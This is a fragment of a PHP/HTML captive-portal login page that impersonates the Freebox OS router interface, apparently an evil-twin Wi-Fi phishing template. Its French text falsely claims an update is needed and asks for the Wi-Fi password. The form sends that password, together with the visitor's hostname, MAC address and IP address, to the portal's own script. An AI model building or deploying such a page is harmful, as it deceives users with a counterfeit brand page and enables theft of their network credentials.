...
?>
  ...
  <head>
    ...
    body {
      background-image: url("assets/img/fbx/bg_freeboxos.svg");
  ...
  <body>
    ...
    <div class="container">
      <div class="account-wall">
        <img class="profile-img" src="assets/img/fbx/freeboxos.svg" alt=""></img>
          ...
          <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" class="form-signin">
			...
			<h5>Mise à jour nécessaire, veuillez saisir votre mot de passe Wifi.</h5>
            <input type="hidden" name="email" class="form-control" placeholder="Email" _autofocus="true" autocorrect="off" autocomplete="username" autocapitalize="off" >
            <input type="password" name="password" class="form-control" placeholder="" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
            <input type="hidden" name="target" value="<?=$destination?>">
            <button class="btn btn-primary btn-block btn-xlarge btn-sharp" name="login" type="submit">Connexion</button>
